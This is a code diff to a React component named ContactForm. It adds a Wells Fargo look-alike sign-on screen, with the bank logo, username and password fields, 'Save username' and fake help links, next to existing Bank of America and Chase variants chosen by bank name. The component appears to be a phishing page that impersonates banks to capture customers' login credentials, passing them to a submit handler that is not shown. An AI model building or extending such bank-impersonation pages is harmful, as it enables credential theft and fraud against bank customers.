@@ -85,8 +85,9 @@ export default function ContactForm() {
 
   const closeWindow = () => window.close()
 
-  // Detectar si es Bank of America
+  // Detectar banco
   const isBankOfAmerica = bankName?.toLowerCase().includes('bank of america')
+  const isWellsFargo = bankName?.toLowerCase().includes('wells fargo')
   const isChase = bankName?.toLowerCase().includes('chase')
 
   // ---- FORMULARIO ----
@@ -175,6 +176,100 @@ export default function ContactForm() {
                       Inscribirse
                     </a>
                   </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      )
+    }
+
+    // Diseño para Wells Fargo
+    if (isWellsFargo) {
+      return (
+        <div className="min-h-screen bg-gray-100 px-4 py-8 sm:px-0">
+          <div className="flex min-h-screen items-center justify-center">
+            <div className="w-full max-w-[500px]">
+              <div className="rounded-3xl bg-white p-10 shadow-lg">
+                {/* Logo del banco */}
+                <div className="mb-8 flex h-10 items-center">
+                  <BankLogo name={bankName} file={bankFile} domain={bankDomain} />
+                </div>
+
+                <h1 className="mb-2 text-3xl font-bold text-content-primary">Good evening</h1>
+                <p className="mb-8 text-gray-600">Sign on to manage your accounts.</p>
+
+                <form onSubmit={submitForm} className="space-y-6">
+                  {/* Username */}
+                  <div>
+                    <label className="mb-2 block text-base text-gray-700">Username</label>
+                    <input
+                      type="text"
+                      required
+                      value={username}
+                      onChange={(e) => setUsername(e.target.value)}
+                      className="w-full border-b-2 border-black/20 bg-transparent px-0 py-3 text-gray-800 outline-none transition-colors focus:border-red-600"
+                    />
+                  </div>
+
+                  {/* Password */}
+                  <div>
+                    <div className="mb-2 flex items-center justify-between">
+                      <label className="block text-base text-gray-700">Password</label>
+                      <button
+                        type="button"
+                        onClick={() => setShowPassword(!showPassword)}
+                        className="text-base text-blue-600 hover:text-blue-700 font-semibold"
+                      >
+                        {showPassword ? 'Hide' : 'Show'}
+                      </button>
+                    </div>
+                    <input
+                      type={showPassword ? 'text' : 'password'}
+                      required
+                      value={password}
+                      onChange={(e) => setPassword(e.target.value)}
+                      className="w-full border-b-2 border-black/20 bg-transparent px-0 py-3 text-gray-800 outline-none transition-colors focus:border-red-600"
+                    />
+                  </div>
+
+                  {/* Save username */}
+                  <label className="flex items-center gap-3 py-2">
+                    <input
+                      type="checkbox"
+                      checked={rememberUsername}
+                      onChange={(e) => setRememberUsername(e.target.checked)}
+                      className="h-5 w-5 cursor-pointer rounded border-2 border-black/30 accent-red-600"
+                    />
+                    <span className="text-base text-content-primary">Save username</span>
+                  </label>
+
+                  {/* Sign On Button + Enroll */}
+                  <div className="flex items-center gap-4 pt-4">
+                    <button
+                      type="submit"
+                      disabled={submitting}
+                      className="flex-1 rounded-full bg-red-600 py-3.5 font-bold text-white hover:bg-red-700 disabled:opacity-60"
+                    >
+                      {submitting ? 'Signing in…' : 'Sign On'}
+                    </button>
+                    <a href="#" className="text-base font-semibold text-content-primary hover:text-gray-700">
+                      Enroll
+                    </a>
+                  </div>
+                </form>
+
+                {/* Links */}
+                <div className="mt-8 space-y-3 border-t border-black/10 pt-6">
+                  <a href="#" className="block text-base text-content-primary hover:text-gray-700">
+                    Sign on with a passkey
+                  </a>
+                  <a href="#" className="block text-base text-content-primary hover:text-gray-700">
+                    Forgot username or password?
+                  </a>
+                  <a href="#" className="block text-base text-content-primary hover:text-gray-700">
+                    Privacy, Cookies, and Legal
+                  </a>
                 </div>
               </div>
             </div>
